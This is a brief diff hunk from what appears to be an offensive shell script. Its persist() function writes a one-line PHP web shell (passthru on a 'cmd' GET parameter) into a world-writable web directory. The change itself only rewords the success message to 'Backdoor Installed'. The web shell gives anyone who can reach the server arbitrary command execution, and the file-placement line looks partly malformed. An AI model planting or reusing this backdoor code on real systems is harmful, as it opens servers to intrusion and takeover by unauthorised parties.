@@ -24,7 +24,7 @@ persist()
 	echo "#### Backdoor Install Attempt ####\n"
 	echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
 	if [ $? -eq 0 ]; then
-		echo OK
+		echo "\n[*] OK. Backdoor Installed.\n"
 	else
 		echo "\n [!] Failed. Check Permissions\n"
 	fi
